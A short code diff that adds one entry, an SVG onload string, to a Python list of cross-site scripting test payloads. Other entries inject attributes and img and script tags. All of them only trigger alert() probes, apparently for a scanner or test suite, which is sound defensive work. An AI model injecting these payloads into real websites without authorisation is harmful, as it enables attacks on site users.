@@ -61,6 +61,7 @@ class XSSPayloads:
         '" autofocus onfocus=alert(\'XSS\') "',
         "' onclick=alert('XSS') '",
         '" onclick=alert(\'XSS\') "',
+        '"><svg onload=alert(1)>',
         "'><img src=x onerror=alert('XSS')>",
         '"><img src=x onerror=alert(\'XSS\')>',
         "'/><script>alert('XSS')</script>",
